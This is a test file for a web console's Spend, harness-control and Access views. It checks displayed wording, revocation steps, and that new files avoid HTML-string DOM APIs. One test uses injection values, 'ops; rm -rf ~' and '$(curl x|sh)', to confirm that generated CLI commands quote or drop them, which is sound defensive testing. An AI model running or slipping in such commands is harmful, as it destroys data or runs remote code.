/**
 * The Spend view says this period's spend against each harness's limit, says when cost
 * is unknown and never shows it as $0, names the renewal day, says a used-up limit is
 * waiting for budget, and the total says "at least" when it must. The header's controls
 * say why one is unavailable and that accepted work is not done work; Access words a
 * person's grants plainly. Every new console file builds DOM without HTML strings, and
 * Home's first paint and the Overview ask for no more than they declare.
 */
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  accessWords,
  hostLines,
  inviteTwin,
  memberTwin,
  membersModel,
  removalActions,
  removalBlocked,
  removalStepLine,
  removalSummary,
  scopeOf,
  // @ts-expect-error — hand-written browser JS, typed as text for the embed map
} from "../assets/js/views/access.js";
// @ts-expect-error — hand-written browser JS, typed as text for the embed map
import { controlsModel, receiptWords } from "../assets/js/views/harness-controls.js";
// @ts-expect-error — hand-written browser JS, typed as text for the embed map
import { spendRowModel, spendTotalLine } from "../assets/js/views/spend.js";

const ROW = {
  harness: "hrn_000000000000000a",
  name: "support",
  present: true,
  periodId: "month-2026-11-01",
  every: "month",
  renewsAt: "2026-12-01T00:00:00.000Z",
  timezone: "UTC",
  capUsdMicros: 10_000_000,
  extensionsUsdMicros: 0,
  spentUsdMicros: 2_500_000,
  reservedUsdMicros: 0,
  unknownCalls: 0,
  exhausted: false,
  truncated: false,
};

describe("the Spend view", () => {
  test("spend against the limit, and the renewal day", () => {
    const m = spendRowModel(ROW);
    expect([m.spent, m.limit, m.renews, m.status]).toEqual([
      "$2.50",
      "$10.00",
      "1 Dec",
      "Within its limit",
    ]);
    expect(m.unknown).toBeNull();
  });

  test("unknown cost says how many calls, never $0", () => {
    const m = spendRowModel({ ...ROW, spentUsdMicros: 0, unknownCalls: 3 });
    expect(m.unknown).toBe("+ cost unknown for 3 calls");
    expect(spendRowModel({ ...ROW, unknownCalls: 1 }).unknown).toBe("+ cost unknown for 1 call");
  });

  test("a used-up limit is waiting for budget until it renews", () => {
    expect(spendRowModel({ ...ROW, exhausted: true }).status).toBe(
      "Waiting for budget until 1 Dec",
    );
  });

  test("no period is no spending limit", () => {
    const m = spendRowModel({
      harness: "hrn_000000000000000b",
      name: "x",
      present: false,
      why: "no_period",
    });
    expect([m.limit, m.status, m.spent]).toEqual([
      "No spending limit",
      "No spending limit",
      "Not tracked",
    ]);
  });

  test("a Home where no harness has a limit shows no $0, and a total names its scope", () => {
    const none = spendTotalLine(
      { harnesses: 0, capUsdMicros: 0, spentUsdMicros: 0, reservedUsdMicros: 0, unknownCalls: 0 },
      2,
    );
    expect(none).toBe("No harness has a spending limit, so spending is not tracked.");
    expect(none).not.toContain("$0");
    for (const row of [
      { harness: "hrn_000000000000000b", name: "b", present: false, why: "no_period" },
      { harness: "hrn_000000000000000c", name: "c", present: false, why: "no_period" },
    ]) {
      expect(JSON.stringify(spendRowModel(row))).not.toContain("$0");
    }
    expect(
      spendTotalLine(
        {
          harnesses: 1,
          capUsdMicros: 1_000_000,
          spentUsdMicros: 250_000,
          reservedUsdMicros: 0,
          unknownCalls: 0,
        },
        3,
      ),
    ).toBe("This period, across the harness with a limit: $0.25 of $1.00 spent.");
  });

  test("the total says at least when some cost is unknown, and names the unknown calls", () => {
    expect(
      spendTotalLine(
        {
          harnesses: 2,
          capUsdMicros: 20_000_000,
          spentUsdMicros: 4_000_000,
          reservedUsdMicros: 0,
          unknownCalls: 2,
          lowerBound: true,
        },
        2,
      ),
    ).toBe("This period: at least $4.00 of $20.00 spent, and cost unknown for 2 calls.");
    expect(
      spendTotalLine(
        {
          harnesses: 1,
          capUsdMicros: 1_000_000,
          spentUsdMicros: 0,
          reservedUsdMicros: 0,
          unknownCalls: 0,
        },
        1,
      ),
    ).toBe("This period: $0.00 of $1.00 spent.");
  });
});

describe("the header's controls", () => {
  test("a control the caller may not use says why, in words", () => {
    const rows = controlsModel(
      { display: { state: "running" }, you: { control: true, deploy: false, retire: false } },
      "hrn_000000000000000a",
    );
    expect(rows.map((r: { label: string }) => r.label)).toEqual([
      "Pause new work",
      "Finish current work, then stop",
      "Disable",
      "Retire…",
    ]);
    expect(rows.map((r: { reason: string | null }) => r.reason)).toEqual([
      null,
      null,
      "Needs Maintainer: ask an owner",
      "Needs Owner: ask an owner",
    ]);
    expect(rows[0]?.twin).toBe("crewhaus daemon pause hrn_000000000000000a");
    expect(rows[0]?.quietOption).toBe("Don't reply to messages while paused");
  });

  test("a paused harness offers Resume, a disabled one Enable", () => {
    const paused = controlsModel({ display: { state: "paused" }, you: {} });
    expect(paused[0]?.label).toBe("Resume new work");
    const off = controlsModel({ display: { state: "disabled" }, you: {} });
    expect(off[2]?.label).toBe("Enable");
  });

  test("the receipt line is the server's sentence, and accepted work is not done", () => {
    expect(
      receiptWords({
        ok: true,
        body: { line: "Paused new work; the daemon confirmed", receipt: { state: "succeeded" } },
      }),
    ).toBe("Paused new work; the daemon confirmed · Done");
    expect(receiptWords({ ok: true, body: { receipt: { state: "accepted" } } })).toBe("Accepted");
    expect(receiptWords({ ok: false, error: { message: "You may not." } })).toBe("You may not.");
  });
});

describe("Access", () => {
  test("a person's grants, in words", () => {
    expect(accessWords([], true)).toBe("Owner of Home");
    expect(
      accessWords([
        { role: "operator", scope: "harness:hrn_000000000000000a" },
        { role: "operator", scope: "harness:hrn_000000000000000b" },
      ]),
    ).toBe("Operator on 2 harnesses");
    expect(accessWords([{ role: "viewer", scope: "home" }])).toBe("Viewer of Home");
    expect(accessWords([])).toBe("No access");
  });

  test("Remove revokes every grant, device, token and link, one request each", () => {
    const [row] = membersModel({
      members: { items: [{ id: "prn_a", kind: "member", displayName: "Ana" }] },
      grants: { items: [{ id: "grt_1", principal: "prn_a", role: "operator", scope: "home" }] },
      devices: { items: [{ id: "dev_1", principal: "prn_a" }] },
      tokens: {
        items: [
          { id: "crd_1", principal: "prn_a" },
          { id: "crd_2", principal: "prn_b" },
        ],
      },
      links: { items: [{ id: "lnk_1", principal: "prn_a" }] },
    });
    expect(row.name).toBe("Ana");
    expect(removalActions(row)).toEqual([
      { id: "access.grants.revoke", params: { grt: "grt_1" } },
      { id: "access.devices.revoke", params: { dev: "dev_1" } },
      { id: "access.tokens.revoke", params: { crd: "crd_1" } },
      { id: "access.links.revoke", params: { lnk: "lnk_1" } },
    ]);
  });

  const ok = (items: unknown[], extra: Record<string, unknown> = {}) => ({
    ok: true,
    status: 200,
    body: { items, ...extra },
  });
  const whole = () => ({
    members: ok([{ id: "prn_a", kind: "member", displayName: "Ana" }]),
    grants: ok([{ id: "grt_1", principal: "prn_a", role: "operator", scope: "home", live: true }]),
    links: ok([]),
    devices: ok([{ id: "dev_1", principal: "prn_a", state: "active" }]),
    tokens: ok([]),
  });

  test("Remove is withheld, and never says signed out everywhere, when a list failed or was cut", () => {
    expect(removalBlocked(whole())).toBeNull();
    const failed = { ...whole(), devices: { ok: false, status: 503, error: { message: "x" } } };
    expect(removalBlocked(failed)).toContain("couldn't be read");
    const cut = { ...whole(), tokens: ok([], { truncated: { reason: "page_limit" } }) };
    expect(removalBlocked(cut)).toContain("more access records");
    const row = { id: "prn_a", name: "Ana" };
    for (const answers of [failed, cut, undefined]) {
      const said = removalSummary(row, answers);
      expect(said).not.toContain("signed out everywhere");
      expect(said).toContain("crewhaus access revoke --member prn_a");
    }
  });

  test("after the revokes, signed out everywhere only when nothing live of theirs is left", () => {
    const row = { id: "prn_a", name: "Ana" };
    expect(removalSummary(row, whole())).toContain(
      "still holds 2 grants, devices, tokens or links",
    );
    const gone = {
      ...whole(),
      grants: ok([
        { id: "grt_1", principal: "prn_a", role: "operator", scope: "home", live: false },
      ]),
      devices: ok([{ id: "dev_1", principal: "prn_a", state: "revoked", revokedAt: "x" }]),
    };
    expect(removalSummary(row, gone)).toBe("Ana is signed out everywhere and has no access now.");
  });

  test("a failed grants read is not No access, and only live rows are revoked", () => {
    const [row] = membersModel({
      members: { items: [{ id: "prn_a", kind: "member", displayName: "Ana" }] },
      devices: {
        items: [
          { id: "dev_1", principal: "prn_a", state: "active" },
          { id: "dev_2", principal: "prn_a", state: "revoked", revokedAt: "x" },
        ],
      },
      tokens: { items: [{ id: "crd_1", principal: "prn_a", live: false }] },
    });
    expect(row.access).toBe("Access couldn't be read");
    expect(removalActions(row)).toEqual([
      { id: "access.devices.revoke", params: { dev: "dev_1" } },
    ]);
  });

  test("each revoke reads in words, with its receipt's state", () => {
    const step = { id: "access.devices.revoke", params: { dev: "dev_1" } };
    expect(removalStepLine(step, { ok: true, body: { receipt: { state: "accepted" } } })).toBe(
      "Signed out of a device: Accepted.",
    );
    expect(
      removalStepLine(
        { id: "access.grants.revoke", params: { grt: "grt_1" } },
        { ok: true, body: { receipt: { state: "succeeded" } } },
      ),
    ).toBe("Grant removed: Done.");
    expect(removalStepLine(step, { ok: false, error: { message: "Gone." } })).toBe(
      "Signed out of a device: Refused. Gone.",
    );
  });

  test("a command the page shows names the member by id, and quotes what it must", () => {
    const twin = memberTwin({ id: "prn_0123456789abcdef", name: "a; touch ~/owned" });
    expect(twin).toBe("crewhaus access revoke --member prn_0123456789abcdef");
    expect(twin).not.toContain("touch");
    expect(inviteTwin("operator", "group", "ops; rm -rf ~")).toBe(
      "crewhaus access invite --role operator --group 'ops; rm -rf ~'",
    );
    expect(inviteTwin("operator", "harness", "$(curl x|sh)")).toBe(
      "crewhaus access invite --role operator --harness '$(curl x|sh)'",
    );
  });

  test("an invite's twin and scope follow where it is for", () => {
    expect(inviteTwin("operator", "harness", "hrn_000000000000000a")).toBe(
      "crewhaus access invite --role operator --harness hrn_000000000000000a",
    );
    expect(inviteTwin("viewer", "home", "")).toBe("crewhaus access invite --role viewer --home");
    expect(scopeOf("group", "ops")).toBe("group:ops");
    expect(scopeOf("harness", "")).toBe("home");
  });

  test("Hosts says where Home runs, and Windows hears that the service is not there yet", () => {
    const lines = hostLines(
      {
        host: { name: "studio", reachedBy: "lan" },
        version: "0.9.0",
        service: { installed: "unknown" },
      },
      "Win32",
    );
    expect(lines[0]).toBe("Home runs on studio, reached over the local network.");
    expect(lines.at(-1)).toContain("isn't supported on Windows yet");
  });
});

describe("the new console files", () => {
  const ROOT = join(import.meta.dir, "..", "assets", "js");
  const FILES = [
    "ui/connectivity.js",
    "ui/version-guard.js",
    "views/access.js",
    "views/decision-card.js",
    "views/harness-controls.js",
    "views/library-group.js",
    "views/overview-cards.js",
    "views/spend.js",
  ];

  test("build DOM without HTML strings", () => {
    let scanned = 0;
    for (const file of FILES) {
      const source = readFileSync(join(ROOT, file), "utf8");
      expect(
        `${file}: ${/innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(source)}`,
      ).toBe(`${file}: false`);
      scanned += 1;
    }
    expect(scanned).toBe(FILES.length);
  });

  test("Home's first paint and the Overview ask for no more than they declare", () => {
    const home = readFileSync(join(ROOT, "views/home.js"), "utf8");
    // The status line is one `home.status` read and Needs you one read of Home's inbox; the
    // other panels keep their own reads.
    expect([...home.matchAll(/call\("([a-z.A-Z]+)"/g)].map((m) => m[1])).toEqual([
      "home.status",
      "attention.list",
    ]);
    const cards = readFileSync(join(ROOT, "views/overview-cards.js"), "utf8");
    const calls = [...cards.matchAll(/call\("([a-z.A-Z]+)"/g)].map((m) => m[1]);
    expect(calls).toEqual([
      "harnesses.get",
      "decisions.list",
      "runs.list",
      "delegations.list",
      "budget.get",
      // The Operating limits card's retry, only when a person asks to read its rules again.
      "delegations.list",
    ]);
  });
});
